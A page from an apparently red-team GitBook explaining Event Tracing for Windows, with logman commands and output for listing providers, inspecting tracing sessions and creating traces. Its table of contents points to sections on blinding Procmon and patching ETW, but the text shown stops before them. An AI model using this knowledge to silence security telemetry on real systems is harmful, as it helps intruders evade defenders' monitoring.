
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>ETW Â· GitBook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        
        
        
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-collapsible-chapters/collapsible-chapters.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search-plus/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="Function hooking.html" />
    
    
    <link rel="prev" href="Elastic EDR.html" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" >
            
                <a target="_blank" href="https://twitter.com/OtterHacker">
            
                    
                    Follow On Twitter
            
                </a>
            

            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="2.1" >
            
                <span>
            
                    
                    Malware
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.1.1" >
            
                <span>
            
                    
                    Docs
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.1.1.1" data-path="Docs/Code snippet.html">
            
                <a href="Docs/Code snippet.html">
            
                    
                    Code Snippet
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.1.2" data-path="Docs/Dumpbin.html">
            
                <a href="Docs/Dumpbin.html">
            
                    
                    Dumpbin
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.1.3" data-path="Docs/NTStructure.html">
            
                <a href="Docs/NTStructure.html">
            
                    
                    NTStructure
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.1.4" data-path="Docs/Passing arguments.html">
            
                <a href="Docs/Passing arguments.html">
            
                    
                    Passing Arguments
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.1.2" >
            
                <span>
            
                    
                    Basics
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.1.2.1" data-path="Introduction/0 - Introduction.html">
            
                <a href="Introduction/0 - Introduction.html">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.2.2" data-path="Introduction/1 - PE.html">
            
                <a href="Introduction/1 - PE.html">
            
                    
                    PE
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.2.3" data-path="Introduction/2 - Payload Storage.html">
            
                <a href="Introduction/2 - Payload Storage.html">
            
                    
                    Payload Storage
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.2.4" data-path="Introduction/3 - Payload Encryption.html">
            
                <a href="Introduction/3 - Payload Encryption.html">
            
                    
                    Payload Encryption
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.2.5" data-path="Introduction/4 - Function Call Obfuscation.html">
            
                <a href="Introduction/4 - Function Call Obfuscation.html">
            
                    
                    Function Call Obfuscation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.2.6" data-path="../Formation/RTO - Malware Development/5 - Backdooring PE.md">
            
                <span>
            
                    
                    Backdooring PE
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.1.3" data-path="CoffLoader.html">
            
                <a href="CoffLoader.html">
            
                    
                    COFF Loader
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.4" data-path="Elastic EDR.html">
            
                <a href="Elastic EDR.html">
            
                    
                    Elastic EDR
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="2.1.5" data-path="ETW.html">
            
                <a href="ETW.html">
            
                    
                    ETW
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.6" data-path="Function hooking.html">
            
                <a href="Function hooking.html">
            
                    
                    Function Hooking
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.7" data-path="Kernel callback.html">
            
                <a href="Kernel callback.html">
            
                    
                    Kernel Callback
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.8" data-path="Module stomping.html">
            
                <a href="Module stomping.html">
            
                    
                    Module Stomping
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.9" data-path="Remote DLL Injection.html">
            
                <a href="Remote DLL Injection.html">
            
                    
                    Remote DLL Injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.10" data-path="Reflective DLL injection.html">
            
                <a href="Reflective DLL injection.html">
            
                    
                    Reflective DLL Injection
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="3.1" >
            
                <span>
            
                    
                    Pentest
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="3.1.1" >
            
                <span>
            
                    
                    Cloud
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="3.1.1.1" data-path="../Pentest/Cloud/Azure.html">
            
                <a href="../Pentest/Cloud/Azure.html">
            
                    
                    Azure
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="3.1.2" >
            
                <span>
            
                    
                    Configuration Review
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="3.1.2.1" data-path="../Pentest/Configuration review/Database.html">
            
                <a href="../Pentest/Configuration review/Database.html">
            
                    
                    Database
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.2.2" data-path="../Pentest/Configuration review/Kubernetes.html">
            
                <a href="../Pentest/Configuration review/Kubernetes.html">
            
                    
                    Kubernetes
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.2.3" data-path="../Pentest/Configuration review/KubernetesCIS.html">
            
                <a href="../Pentest/Configuration review/KubernetesCIS.html">
            
                    
                    KubernetesCIS
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="3.1.3" >
            
                <span>
            
                    
                    Services
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="3.1.3.1" data-path="../Pentest/Services/AD.html">
            
                <a href="../Pentest/Services/AD.html">
            
                    
                    AD
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.3.2" >
            
                <span>
            
                    
                    Databases
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="3.1.3.2.1" data-path="../Pentest/Services/Oracle database.html">
            
                <a href="../Pentest/Services/Oracle database.html">
            
                    
                    Oracle Database
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.3.2.2" data-path="../Pentest/Services/MSSQL.html">
            
                <a href="../Pentest/Services/MSSQL.html">
            
                    
                    MSSQL
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="3.1.3.3" data-path="../Pentest/Services/DNS.html">
            
                <a href="../Pentest/Services/DNS.html">
            
                    
                    DNS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.3.4" data-path="../Pentest/Services/IPMI.html">
            
                <a href="../Pentest/Services/IPMI.html">
            
                    
                    IPMI
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.3.5" data-path="../Pentest/Services/Kerberos.html">
            
                <a href="../Pentest/Services/Kerberos.html">
            
                    
                    Kerberos
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.3.6" data-path="../Pentest/Services/LDAP.html">
            
                <a href="../Pentest/Services/LDAP.html">
            
                    
                    LDAP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.3.7" data-path="../Pentest/Services/Memcached.html">
            
                <a href="../Pentest/Services/Memcached.html">
            
                    
                    Memcached
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.3.8" data-path="../Pentest/Services/NFS.html">
            
                <a href="../Pentest/Services/NFS.html">
            
                    
                    NFS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.3.9" data-path="../Pentest/Services/RPC.html">
            
                <a href="../Pentest/Services/RPC.html">
            
                    
                    RPC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.3.10" data-path="../Pentest/Services/SMB.html">
            
                <a href="../Pentest/Services/SMB.html">
            
                    
                    SMB
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.3.11" data-path="../Pentest/Services/SNMP.html">
            
                <a href="../Pentest/Services/SNMP.html">
            
                    
                    SNMP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.3.12" data-path="../Pentest/Services/Tomcat.html">
            
                <a href="../Pentest/Services/Tomcat.html">
            
                    
                    Tomcat
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.3.13" data-path="../Pentest/Services/WebDAV.html">
            
                <a href="../Pentest/Services/WebDAV.html">
            
                    
                    WebDAV
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="3.1.4" >
            
                <span>
            
                    
                    Techniques
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="3.1.4.1" data-path="../Pentest/Techniques/ADCS abuses.html">
            
                <a href="../Pentest/Techniques/ADCS abuses.html">
            
                    
                    Abuse ADCS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.4.2" data-path="../Pentest/Techniques/Abuse tokens.html">
            
                <a href="../Pentest/Techniques/Abuse tokens.html">
            
                    
                    Abuse Tokens
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.4.3" data-path="../Pentest/Techniques/Trusts abuses.html">
            
                <a href="../Pentest/Techniques/Trusts abuses.html">
            
                    
                    Abuse Trusts
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.4.4" data-path="../Pentest/Techniques/Buffer overflow.html">
            
                <a href="../Pentest/Techniques/Buffer overflow.html">
            
                    
                    Buffer Overflow
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.4.5" data-path="../Pentest/Techniques/Command injection.html">
            
                <a href="../Pentest/Techniques/Command injection.html">
            
                    
                    Command Injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.4.6" data-path="../Pentest/Techniques/Data exfiltration.html">
            
                <a href="../Pentest/Techniques/Data exfiltration.html">
            
                    
                    Data Exfiltration
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.4.7" data-path="../Pentest/Techniques/Exploit handles.html">
            
                <a href="../Pentest/Techniques/Exploit handles.html">
            
                    
                    Exploit handles
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.4.8" data-path="../Pentest/Techniques/Filtering.html">
            
                <a href="../Pentest/Techniques/Filtering.html">
            
                    
                    Filtering
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.4.9" data-path="../Pentest/Techniques/Kioske escape.html">
            
                <a href="../Pentest/Techniques/Kioske escape.html">
            
                    
                    Kioske Escape
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.4.10" data-path="../Pentest/Techniques/LFI.html">
            
                <a href="../Pentest/Techniques/LFI.html">
            
                    
                    LFI
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.4.11" data-path="../Pentest/Techniques/Password spraying.html">
            
                <a href="../Pentest/Techniques/Password spraying.html">
            
                    
                    Password Spraying
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.4.12" data-path="../Pentest/Techniques/Pivoting.html">
            
                <a href="../Pentest/Techniques/Pivoting.html">
            
                    
                    Pivoting
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.4.13" >
            
                <span>
            
                    
                    Privilege Escalation
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="3.1.4.13.1" data-path="../Pentest/Techniques/Privileges escalation/Windows.html">
            
                <a href="../Pentest/Techniques/Privileges escalation/Windows.html">
            
                    
                    Windows
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.4.13.2" data-path="../Pentest/Techniques/Privileges escalation/Linux.html">
            
                <a href="../Pentest/Techniques/Privileges escalation/Linux.html">
            
                    
                    Linux
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="3.1.4.14" data-path="../Pentest/Techniques/Reverse shell.html">
            
                <a href="../Pentest/Techniques/Reverse shell.html">
            
                    
                    Reverse Shell
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.4.15" data-path="../Pentest/Techniques/Shellshock.html">
            
                <a href="../Pentest/Techniques/Shellshock.html">
            
                    
                    Shellshock
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.4.16" data-path="../Pentest/Techniques/SQL injection.html">
            
                <a href="../Pentest/Techniques/SQL injection.html">
            
                    
                    SQL Injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.4.17" data-path="../Pentest/Techniques/SSTI.html">
            
                <a href="../Pentest/Techniques/SSTI.html">
            
                    
                    SSTI
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="3.1.5" >
            
                <span>
            
                    
                    Technology
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="3.1.5.1" data-path="../Pentest/Technology/AD.html">
            
                <a href="../Pentest/Technology/AD.html">
            
                    
                    AD
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.5.2" data-path="../Pentest/Technology/IOS.html">
            
                <a href="../Pentest/Technology/IOS.html">
            
                    
                    IOS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.5.3" data-path="../Pentest/Technology/NAC.html">
            
                <a href="../Pentest/Technology/NAC.html">
            
                    
                    NAC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.5.4" data-path="../Pentest/Technology/Port Knocking.html">
            
                <a href="../Pentest/Technology/Port Knocking.html">
            
                    
                    Port Knocking
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.5.5" data-path="../Pentest/Technology/SAML.html">
            
                <a href="../Pentest/Technology/SAML.html">
            
                    
                    SAML
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.5.6" data-path="../Pentest/Technology/SAP.html">
            
                <a href="../Pentest/Technology/SAP.html">
            
                    
                    SAP
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="3.1.6" >
            
                <span>
            
                    
                    Tools
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="3.1.6.1" data-path="../Pentest/Tools/BloundHound.html">
            
                <a href="../Pentest/Tools/BloundHound.html">
            
                    
                    BloundHound
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.6.2" data-path="../Pentest/Tools/CME.html">
            
                <a href="../Pentest/Tools/CME.html">
            
                    
                    CME
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.6.3" data-path="../Pentest/Tools/Curl.html">
            
                <a href="../Pentest/Tools/Curl.html">
            
                    
                    Curl
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.6.4" data-path="../Pentest/Tools/Ffuf.html">
            
                <a href="../Pentest/Tools/Ffuf.html">
            
                    
                    FFUF
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.6.5" data-path="../Pentest/Tools/Find.html">
            
                <a href="../Pentest/Tools/Find.html">
            
                    
                    Find
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.6.6" data-path="../Pentest/Tools/Hydra.html">
            
                <a href="../Pentest/Tools/Hydra.html">
            
                    
                    Hydra
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.6.7" data-path="../Pentest/Tools/PowerView.html">
            
                <a href="../Pentest/Tools/PowerView.html">
            
                    
                    PowerView
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.6.8" data-path="../Pentest/Tools/Powershell.html">
            
                <a href="../Pentest/Tools/Powershell.html">
            
                    
                    Powershell
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.6.9" data-path="../Pentest/Tools/Responder.html">
            
                <a href="../Pentest/Tools/Responder.html">
            
                    
                    Responder
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.6.10" data-path="../Pentest/Tools/Rubeus.html">
            
                <a href="../Pentest/Tools/Rubeus.html">
            
                    
                    Rubeus
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.6.11" data-path="../Pentest/Tools/Strace.html">
            
                <a href="../Pentest/Tools/Strace.html">
            
                    
                    Strace
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.6.12" data-path="../Pentest/Tools/Wfuzz.html">
            
                <a href="../Pentest/Tools/Wfuzz.html">
            
                    
                    Wfuzz
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="4.1" >
            
                <span>
            
                    
                    Rainy Sunday
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="4.1.1" data-path="../Serveur/KMS/KMS.html">
            
                <a href="../Serveur/KMS/KMS.html">
            
                    
                    KMS Activation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.2" data-path="../Serveur/LicenceKey.html">
            
                <a href="../Serveur/LicenceKey.html">
            
                    
                    Licence Key
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >ETW</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div class="search-plus" id="book-search-results">
    <div class="search-noresults">
    
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="etw">ETW</h1>
<h1 id="table-of-content">Table of content</h1>
<!-- toc -->
<ul>
<li><a href="#overview">Overview</a></li>
<li><a href="#logman">Logman</a><ul>
<li><a href="#providers">Providers</a><ul>
<li><a href="#list-providers">List providers</a></li>
<li><a href="#inspect-providers">Inspect Providers</a></li>
</ul>
</li>
<li><a href="#tracing-sessions">Tracing sessions</a><ul>
<li><a href="#list-tracing-sessions">List tracing sessions</a></li>
<li><a href="#inspect-tracing-sessions">Inspect tracing sessions</a></li>
<li><a href="#use-tracing-sessions">Use tracing sessions</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#silketw">SilkETW</a></li>
<li><a href="#procmon">Procmon</a><ul>
<li><a href="#blinding-procmon">Blinding Procmon</a></li>
<li><a href="#automating-the-process">Automating the process</a><ul>
<li><a href="#detect-procmon-tracing-session">Detect Procmon tracing session</a></li>
<li><a href="#kill-procmon-tracing-session">Kill Procmon tracing session</a></li>
<li><a href="#create-a-new-tracing-session">Create a new tracing session</a></li>
<li><a href="#make-it-persistent">Make it persistent</a></li>
<li><a href="#limits">Limits</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#patching-etw">Patching ETW</a><ul>
<li><a href="#writing-event-to-a-provider">Writing event to a provider</a><ul>
<li><a href="#finding-the-api">Finding the API</a></li>
<li><a href="#patch-the-dll">Patch the DLL</a></li>
<li><a href="#limits-1">Limits</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<!-- tocstop -->
<h1 id="overview">Overview</h1>
<p>The <code>Event Tracing for Windows</code> or <code>ETW</code> is the mechanism used by <code>Windows</code> to log system events. <code>ETW</code> are designed through a <code>provider/consumer</code> concept. 
The different process write their events in the <code>providers</code> and the <code>consumers</code> can access to these events through the <code>providers</code>.</p>
<p><img src="img/ETW/Workflow.jpg" alt="ETW Workflow"></p>
<p>Several <code>antivirus</code> or <code>EDR</code> solutions such as <code>Microsoft ATP</code> heavily use these events to monitor the system.</p>
<p>The <code>ETW</code> events can be raised by the kernel but also by some userland functions. For example, when performing a simple <code>HTTP</code> request to use the <code>WinHTTP</code> <code>API</code>, an event is raised by the <code>WinHttpSendRequest</code> function on userland, but another event is also raised by the kernel when the connection is bound at the <code>OS</code> level.</p>
<p>While removing userland events can be quite easy, tackling down kernel events can be more challenging.</p>
<h1 id="logman">Logman</h1>
<p><code>Windows</code> provides a built-in tool to access to the <code>ETW</code> tracing sessions: <code>logman</code>. This tool can be used to create, inspect and modify tracing sessions, inspect the different providers and other interesting things.</p>
<h2 id="providers">Providers</h2>
<p>The providers are the first stage of the <code>ETW</code> workflow. They are used to collect and categorize events generated by the different processes.</p>
<h3 id="list-providers">List providers</h3>
<p>The different providers can be listed using the following <code>lgoman</code> command:</p>
<pre><code class="lang-powershell">logman query providers


<span class="hljs-comment"># Provider                                 GUID</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------</span>
<span class="hljs-comment"># _802dot1X                                {1B243C08-ABC2-C043-37FD-A730D9E8E45C}</span>
<span class="hljs-comment"># ACPI Driver Trace Provider               {DAB01D4D-2D48-477D-B1C3-DAAD0CE6F06B}</span>
<span class="hljs-comment"># Active Directory Domain Services: SAM    {8E598056-8993-11D2-819E-0000F875A064}</span>
<span class="hljs-comment"># Active Directory: Kerberos Client        {BBA3ADD2-C229-4CDB-AE2B-57EB6966B0C4}</span>
<span class="hljs-comment"># Active Directory: NetLogon               {F33959B4-DBEC-11D2-895B-00C04F79AB69}</span>
<span class="hljs-comment"># ADODB.1                                  {04C8A86F-3369-12F8-4769-24E484A9E725}</span>
<span class="hljs-comment"># ADOMD.1                                  {7EA56435-3F2F-3F63-A829-F0B35B5CAD41}</span>
<span class="hljs-comment"># Application Popup                        {47BFA2B7-BD54-4FAC-B70B-29021084CA8F}</span>
<span class="hljs-comment"># Application-Addon-Event-Provider         {A83FA99F-C356-4DED-9FD6-5A5EB8546D68}</span>
<span class="hljs-comment"># ATA Port Driver Tracing Provider         {D08BD885-501E-489A-BAC6-B7D24BFE6BBF}</span>
<span class="hljs-comment"># AuthFw NetShell Plugin                   {935F4AE6-845D-41C6-97FA-380DAD429B72}</span>
<span class="hljs-comment"># ...</span>
</code></pre>
<p>As you can see, there are a lot of providers. Each provider is &quot;specialized&quot; in some types of events (such as the <code>Microsoft-Windows-WinHTTP</code>) but some other can compile several types of events such as the <code>Windows Kernel Trace</code> that compile event raised by kernel functions such as <code>VirtualAlloc</code> or <code>CreateProcess</code>.</p>
<h3 id="inspect-providers">Inspect Providers</h3>
<p>If you want to retrieve a specific type of event, it could be quite challenging as the providers dumped by <code>logman</code> do not show the event they are channeling.</p>
<p>However, <code>logman</code> can be used to inspect the different providers and extract the events they provide.</p>
<pre><code class="lang-powershell">logman query providers <span class="hljs-string">&quot;Microsoft-Windows-WinHTTP&quot;</span>
Provider                                 GUID
-------------------------------------------------------------------------------
Microsoft-Windows-WinHttp                {<span class="hljs-number">7</span>D44233D-<span class="hljs-number">3055</span>-<span class="hljs-number">4</span>B9C-BA64-<span class="hljs-number">0</span>D47CA40A232}

<span class="hljs-comment"># Value               Keyword              Description</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------</span>
<span class="hljs-comment"># 0x0000000000000001  Keyword.API          API</span>
<span class="hljs-comment"># 0x0000000000000020  WINHTTP_KEYWORD_AUTOPROXY Flagged on all WinHTTP events dealing with AUTOPROXY</span>
<span class="hljs-comment"># 0x0000000100000000  Keyword.SEND         SEND</span>
<span class="hljs-comment"># 0x0000000200000000  Keyword.RECEIVE      RECEIVE</span>
<span class="hljs-comment"># 0x0000000400000000  Keyword.L3_CONNECT   L3_CONNECT</span>
<span class="hljs-comment"># 0x0000001000000000  Keyword.CLOSE        CLOSE</span>
<span class="hljs-comment"># 0x0000002000000000  Keyword.SECURITY     SECURITY</span>
<span class="hljs-comment"># 0x0000004000000000  Keyword.CONFIGURATION CONFIGURATION</span>
<span class="hljs-comment"># 0x0000008000000000  Keyword.GLOBAL       GLOBAL</span>
<span class="hljs-comment"># 0x0000010000000000  Keyword.DROPPED      DROPPED</span>
<span class="hljs-comment"># 0x0000020000000000  Keyword.PII_PRESENT  PII_PRESENT</span>
<span class="hljs-comment"># 0x0000040000000000  Keyword.PACKET       PACKET</span>
<span class="hljs-comment"># 0x0000080000000000  Keyword.ADDRESS      ADDRESS</span>
<span class="hljs-comment"># 0x0000100000000000  Keyword.CONTEXT_EVENT CONTEXT_EVENT</span>
<span class="hljs-comment"># 0x0000200000000000  Keyword.STATE_TRANSITION STATE_TRANSITION</span>
<span class="hljs-comment"># 0x0001000000000000  win:ResponseTime     Response Time</span>
<span class="hljs-comment"># 0x0080000000000000  win:EventlogClassic  Classic</span>
<span class="hljs-comment"># 0x8000000000000000  Microsoft-Windows-WinHttp/Diagnostic</span>
<span class="hljs-comment"># 0x4000000000000000  Microsoft-Windows-WinHTTP-NDF/Diagnostic</span>
<span class="hljs-comment"># ...</span>
</code></pre>
<p>Likewise, this command dumps the different event keys logged by the provider and several other information such as the verbosity level or the different processes that provide events to this provider.</p>
<p>However, it is not possible to retrieve more information about the events as they are usually not documented and it is one of the most important problem with <code>ETW</code> for defenders.</p>
<h2 id="tracing-sessions">Tracing sessions</h2>
<p>As explained in the <code>ETW</code> workflow, the providers collect events raised by processes and tracing sessions will retrieve these events from the providers. The tracing sessions can be seen as a collection of events coming from different chosen providers.</p>
<p>For example, if you want to only retrieve event raised by memory allocation and <code>HTTP</code> connections, you will not be able to find one provider that collects these two types of events. However, you can create a tracing session fed by the <code>Windows Kernel Tracing</code> and the <code>Microsoft-Windows-WinHTTP</code> provider that will give you the two types of events you want.</p>
<p>Tracing sessions can be seen as a personal collection of events.</p>
<h3 id="list-tracing-sessions">List tracing sessions</h3>
<p><code>Logman</code> can be used to display the active tracing sessions:</p>
<pre><code class="lang-powershell">logman query -ets

<span class="hljs-comment"># Data Collector Set                      Type                          Status</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------</span>
<span class="hljs-comment"># Circular Kernel Context Logger          Trace                         Running</span>
<span class="hljs-comment"># Eventlog-Security                       Trace                         Running</span>
<span class="hljs-comment"># DiagLog                                 Trace                         Running</span>
<span class="hljs-comment"># Diagtrack-Listener                      Trace                         Running</span>
<span class="hljs-comment"># EventLog-Application                    Trace                         Running</span>
<span class="hljs-comment"># EventLog-System                         Trace                         Running</span>
<span class="hljs-comment"># iclsClient                              Trace                         Running</span>
<span class="hljs-comment"># ...</span>
</code></pre>
<h3 id="inspect-tracing-sessions">Inspect tracing sessions</h3>
<p>The different tracing sessions are linked to providers. It is possible to inspect the providers queried by each tracing session with the following <code>logman</code> command:</p>
<pre><code class="lang-powershell">logman query iclsClient -ets

<span class="hljs-comment"># Name:                 iclsClient</span>
<span class="hljs-comment"># Status:               Running</span>
<span class="hljs-comment"># Root Path:            C:\Windows\System32\LogFiles\WMI\Intel\iCLSClient</span>
<span class="hljs-comment"># Segment:              Off</span>
<span class="hljs-comment"># Schedules:            On</span>
<span class="hljs-comment"># Segment Max Size:     40 MB</span>
<span class="hljs-comment"># </span>
<span class="hljs-comment"># Name:                 iclsClient\iclsClient</span>
<span class="hljs-comment"># Type:                 Trace</span>
<span class="hljs-comment"># Output Location:      C:\Windows\System32\LogFiles\WMI\Intel\iCLSClient\iclsClient.etl.013</span>
<span class="hljs-comment"># Append:               Off</span>
<span class="hljs-comment"># Circular:             On</span>
<span class="hljs-comment"># Overwrite:            Off</span>
<span class="hljs-comment"># Buffer Size:          4</span>
<span class="hljs-comment"># Buffers Lost:         0</span>
<span class="hljs-comment"># Buffers Written:      23</span>
<span class="hljs-comment"># Buffer Flush Timer:   2</span>
<span class="hljs-comment"># Clock Type:           Performance</span>
<span class="hljs-comment"># File Mode:            File</span>
<span class="hljs-comment"># </span>
<span class="hljs-comment"># Provider:</span>
<span class="hljs-comment"># Name:                 Intel-Autologger-iclsClient</span>
<span class="hljs-comment"># Provider Guid:        {B8D7E9A0-65D5-40BE-AFEA-83593FC0164E}</span>
<span class="hljs-comment"># Level:                255</span>
<span class="hljs-comment"># KeywordsAll:          0x0</span>
<span class="hljs-comment"># KeywordsAny:          0xffffffffffffffff</span>
<span class="hljs-comment"># Properties:           64</span>
<span class="hljs-comment"># Filter Type:          0</span>
</code></pre>
<h3 id="use-tracing-sessions">Use tracing sessions</h3>
<p>The following command can be used to start a tracing session</p>
<pre><code class="lang-powershell">logman create trace ${tracingSessionName} -ets
</code></pre>
<p>Once the session is created, some providers must be added using the following command :</p>
<pre><code class="lang-powershell">logman update ${tracingSessionName} -p ${providerName} ${eventValue} -ets
</code></pre>
